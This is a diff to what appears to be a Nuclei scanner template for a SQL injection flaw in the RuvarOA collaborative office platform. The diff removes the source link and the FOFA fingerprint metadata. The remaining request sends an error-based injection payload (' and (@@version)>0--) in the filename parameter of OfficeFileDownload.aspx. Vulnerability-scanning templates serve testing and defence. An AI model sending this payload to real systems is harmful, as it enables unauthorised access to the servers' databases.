@@ -3,12 +3,8 @@ info:
   name: RuvarOA协同办公平台-OfficeFileDownload-SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gt3q913pb839f7on'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gt3q913pb839f7on
-    fofa: body="txt_admin_key"
 http:
 - raw:
   - 'GET /WorkFlow/OfficeFileDownload.aspx?filename=1%27%20and%20%28@@version%29%3E0-- HTTP/1.1
